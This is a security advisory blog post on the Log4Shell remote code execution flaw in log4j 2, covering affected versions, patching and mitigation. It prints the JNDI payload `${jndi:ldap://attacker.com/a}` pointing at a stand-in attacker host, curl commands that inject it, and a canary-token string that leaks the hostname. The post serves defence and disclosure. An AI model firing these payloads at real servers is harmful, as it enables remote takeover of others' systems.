---
title: "Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package"
description: Given how ubiquitous log4j is, the impact of this vulnerability is quite severe. Learn how to patch it, why it's bad, and more in this post.
slug: log4j-zero-day
image: https://www.lunasec.io/docs/img/log4shell-logo.png
date: 2021-12-12
keywords: [log4shell, log4j, log4j2, rce, java, zero-day]
authors:
- name: Free Wortley
  title: CEO at LunaSec
  url: https://github.com/freeqaz
  image_url: https://github.com/freeqaz.png
  tags: [zero-day, security, data-security, data-breaches]
- name: Chris Thompson
  title: Developer at Lunasec
  url: https://github.com/breadchris
  image_url: https://github.com/breadchris.png
- name: Forrest Allison
  title: Developer at LunaSec
  url: https://github.com/factoidforrest
  image_url: https://github.com/factoidforrest.png

---
<!--
  ~ Copyright by LunaSec (owned by Refinery Labs, Inc)
  ~
  ~ Licensed under the Creative Commons Attribution-ShareAlike 4.0 International
  ~ (the "License"); you may not use this file except in compliance with the
  ~ License. You may obtain a copy of the License at
  ~
  ~ https://creativecommons.org/licenses/by-sa/4.0/legalcode
  ~
  ~ See the License for the specific language governing permissions and
  ~ limitations under the License.
  ~
-->

![Log4Shell Logo](https://www.lunasec.io/docs/img/log4shell-logo.png)

**See Our Updated Mitigation Guide including our automated scanning tool**: https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide

## What is it?
On Thursday (December 9th), a 0-day exploit in the
popular Java logging library `log4j` (version 2) was discovered that results in Remote Code Execution (RCE) by
logging a certain string.

Given how ubiquitous this library is, the impact of the exploit (full server control), and how easy it is to exploit,
the impact of this vulnerability is quite severe. We're calling it "Log4Shell" for short.

The 0-day was [tweeted](https://twitter.com/P0rZ9/status/1468949890571337731) along with a POC posted on
[GitHub](https://github.com/tangxiaofeng7/apache-log4j-poc).  It has now been published as [CVE-2021-44228](https://www.randori.com/blog/cve-2021-44228/).

This post provides resources to help you understand the vulnerability and how to mitigate it.

<!--truncate-->

_Originally Posted @ December 9th & Last Updated @ December 13th, 1:32am PST_

_This blog post is also available at https://log4shell.com/_


## Who is impacted?

Many, many services are vulnerable to this exploit.  Cloud services like [Steam, Apple iCloud](https://news.ycombinator.com/item?id=29499867), and apps like
Minecraft have already been found to be vulnerable.

An extensive list of responses from impacted organizations has been compiled [here](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592).

Anybody using Apache Struts is likely vulnerable. We've seen similar vulnerabilities exploited before in breaches like
the [2017 Equifax data breach](https://en.wikipedia.org/wiki/2017_Equifax_data_breach#Data_breach).

Many Open Source projects
like the Minecraft server, [Paper](https://github.com/PaperMC/Paper/commit/b475c6a683fa34156b964f751985f36a784ca0e0),
have already begun patching their usage of `log4j2`.

Simply [changing an iPhone's name](https://twitter.com/chvancooten/status/1469340927923826691) has been shown to trigger the
vulnerability in Apple's servers.

**Updates (3 hours after posting):**
According to [this blog post](https://www.cnblogs.com/yyhuni/p/15088134.html) (see [translation](https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US)),
JDK versions greater than `6u211`, `7u201`, `8u191`, and `11.0.1` are not affected by the LDAP attack vector. In these versions
`com.sun.jndi.ldap.object.trustURLCodebase` is set to `false` meaning JNDI cannot load remote code using LDAP.

However, there are other attack vectors targeting this vulnerability which can result in RCE. An attacker could still leverage
existing code on the server to execute a payload. An attack targeting the class
`org.apache.naming.factory.BeanFactory`, present on Apache Tomcat servers, is discussed
in [this blog post](https://www.veracode.com/blog/research/exploiting-jndi-injections-java).

** Edit: ** To see if you are impacted, you can use our [automatic scanning tool](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide).

## Affected Apache log4j Versions

### log4j v2

Almost all versions of log4j version 2 are affected.

`2.0-beta9 <= Apache log4j <= 2.14.1`

:::caution Limited vulnerability in `2.15.0`
As of Tuesday, Dec 14, version `2.15.0` was found to still have a possible [vulnerability in some apps](https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f).
We recommend updating to `2.16.0` which removes the JNDI feature entirely.
:::
### log4j v1

Version 1 of log4j is vulnerable to other RCE attacks, and if you're using it you need to 
[migrate](https://logging.apache.org/log4j/2.x/manual/migration.html) to `2.16.0`.

## Permanent Mitigation

**For Current Information:** We have written a comprehensive guide on [log4j mitigation strategies](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide).

Version 2.16.0 of log4j has been released without the vulnerability. log4j-core.jar is available on Maven Central [here](https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.16.0/), with [[release notes](https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0)] and
[[log4j security announcements](https://logging.apache.org/log4j/2.x/security.html)].

The release can also be downloaded from the Apache Log4j [Download](https://logging.apache.org/log4j/2.x/download.html) page.

## Temporary Mitigation

**For Current Information:** Please read our follow-up guide on [log4j mitigation strategies](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide).

:::warning `formatMsgNoLookups` Does not protect against all attacks
As of Tuesday, Dec 14, it's been found that this flag is ineffective at stopping certain attacks, partially explained 
[CVE-2021-45046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046).  
You must update to `2.16.0` or use the JNDI patches for temporary mitigation explained in [our mitigation guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/).
:::

As per [this discussion on HackerNews](https://news.ycombinator.com/item?id=29507263):

> The 'formatMsgNoLookups' property was added in version 2.10.0, per the JIRA Issue LOG4J2-2109 [1] that proposed it. Therefore the 'formatMsgNoLookups=true' mitigation strategy is available in version 2.10.0 and higher, but is no longer necessary with version 2.15.0, because it then becomes the default behavior [2][3].
>
> If you are using a version older than 2.10.0 and cannot upgrade, your mitigation choices are:
>
> - ~~Modify every logging pattern layout to say `%m{nolookups}` instead of `%m` in your logging
>   config files, see details at https://issues.apache.org/jira/browse/LOG4J2-2109 (only works on
>   versions >= 2.7) or,~~ This is a bad strategy that will likely result in a vulnerability long-term.
>
> - Substitute a non-vulnerable or empty implementation of the
    class org.apache.logging.log4j.core.lookup.JndiLookup, in a way that your classloader uses your
    replacement instead of the vulnerable version of the class. Refer to your application's or
    stack's classloading documentation to understand this behavior.

## How the exploit works

### Exploit Requirements

- A server with a vulnerable `log4j` version (listed above),
- an endpoint with any protocol (HTTP, TCP, etc) that allows an attacker to send the exploit string,
- and a log statement that logs out the string from that request.

### Example Vulnerable Code

```ts
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.*;
import java.sql.SQLException;
import java.util.*;

public class VulnerableLog4jExampleHandler implements HttpHandler {

  static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());

  /**
   * A simple HTTP endpoint that reads the request's x-api-version header and logs it back.
   * This is pseudo-code to explain the vulnerability, and not a full example.
   * @param he HTTP Request Object
   */
  public void handle(HttpExchange he) throws IOException {
    String apiVersion = he.getRequestHeader("X-Api-Version");

    // This line triggers the RCE by logging the attacker-controlled HTTP header.
    // The attacker can set their X-Api-Version header to: ${jndi:ldap://attacker.com/a}
    log.info("Requested Api Version:{}", apiVersion);

    String response = "<h1>Hello from: " + apiVersion + "!</h1>";
    he.sendResponseHeaders(200, response.length());
    OutputStream os = he.getResponseBody();
    os.write(response.getBytes());
    os.close();
  }
}
```

#### Reproducing Locally

If you want to reproduce this vulnerability locally, you can refer to christophetd's [vulnerable app](https://github.com/christophetd/log4shell-vulnerable-app).

In a terminal run:

```shell
docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```

and in another:

```shell
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
```

the logs should include an error message indicating that a remote lookup was attempted but failed:

```shell
2021-12-10 17:14:56,207 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://127.0.0.1/a]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
```

### Exploit Steps

1. Data from the User gets sent to the server (via any protocol),
2. The server logs the data in the request, containing the malicious payload: `${jndi:ldap://attacker.com/a}` (where `attacker.com` is an attacker controlled server),
3. The `log4j` vulnerability is triggered by this payload and the server makes a request to `attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI),
4. This response contains a path to a remote Java class file (ex. `http://second-stage.attacker.com/Exploit.class`) which is injected into the server process,
5. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.

Due to how common Java vulnerabilities such as these are, security researchers have created tools to easily exploit
them. The [marshalsec](https://github.com/mbechler/marshalsec) project is one of many that demonstrates generating an
exploit payload that could be used for this vulnerability. You can refer to [this malicious LDAP server](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) for an example of exploitation.

## How to identify vulnerable remote servers

Make sure that you have permission from the owner of the server to be penetration tested.  

The simplest way to detect if a remote endpoint is vulnerable is to trigger a DNS query. As explained above,
the exploit will cause the vulnerable server to attempt to fetch some remote code.  By using the address
of a free online DNS logging tool in the exploit string, we can detect when the vulnerability is triggered.  

[CanaryTokens.org](https://canarytokens.org/generate#) is an Open Source web app for this purpose that even generates the exploit string automatically 
and sends an email notification when the DNS is queried.  Select `Log4Shell` from the drop-down menu. Then, embed the string 
in a request field that you expect the server to log.  This could be an anything from a form
input to an HTTP header.  In our example above, the X-Api-Version header was being logged. This request should trigger it:

```shell
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.<RANDOM_STRING>.canarytokens.com/a}'
```

:::info These requests may not be private
If you wish to test more discretely, you may [setup your own authoritative DNS server](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)
for testing.
:::

## More information

You can follow us on [Twitter](https://twitter.com/LunaSecIO) where we'll continue to update you as information about the impact of this exploit becomes available.

For now, we're just publishing this to help raise awareness and get people patching it. Please tell any of your friends
running Java software!

### Limit your vulnerability to future attacks

[LunaSec](https://www.lunasec.io/docs/pages/overview/introduction/) is an Open Source Data Security framework that
[isolates and protects](https://www.lunasec.io/docs/pages/how-it-works/features/) sensitive data in web applications.
It limits vulnerability to attacks like _Log4Shell_ and can help protect against future 0-days, before they happen.

### Editing this post

If you have any updates or edits you'd like to make, you can edit this post as Markdown on
[GitHub](https://github.com/lunasec-io/lunasec/blob/master/docs/blog/2021-12-09-log4j-zero-day.md). And please throw us a Star ⭐!

### Links

- **[Hacker News](https://news.ycombinator.com/item?id=29504755)**
- **[Reddit](https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/)**
- **[Twitter](https://twitter.com/freeqaz/status/1469121757361569793?s=20)**

### Edits

1. Updated the "Who is impacted?" section to include mitigating factor based on JDK version, but also suggest other exploitation
methods are still prevalent.
2. ~~Named the vulnerability "LogJam",~~ added CVE, and added link to release tags.
3. Update mitigation steps with newer information.
4. Removed the name "LogJam" because it's already been [used](https://en.wikipedia.org/wiki/Logjam_(computer_security)). Using "Log4Shell" instead.
5. Update that 2.15.0 is released.
6. Added the MS Paint logo[4], and updated example code to be slightly more clear (it's not string concatenation).
7. Reported on iPhones being affected by the vulnerability, and included local reproduction code + steps.
8. Update social info.
9. Updated example code to use Log4j2 syntax.
10. Update title because of some confusion.
11. Better DNS testing site and explanation
12. Added link to the [Log4Shell Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide).
13. Add warnings about limited vuln in 2.15 / noMsgFormatLookups
### References

[1] [JIRA LOG4J-2190](https://issues.apache.org/jira/browse/LOG4J2-2109)

[2] [logging-log4j Github](https://github.com/apache/logging-log4j2/pull/607/files)

[3] [JIRA LOG4J-3198](https://issues.apache.org/jira/browse/LOG4J2-3198)

[4] Kudos to [@GossiTheDog](https://twitter.com/GossiTheDog/status/1469252646745874435) for the MS Paint logo!

Also kudos to @80vul for [tweeting](https://twitter.com/80vul/status/1468968891489857537) about this.
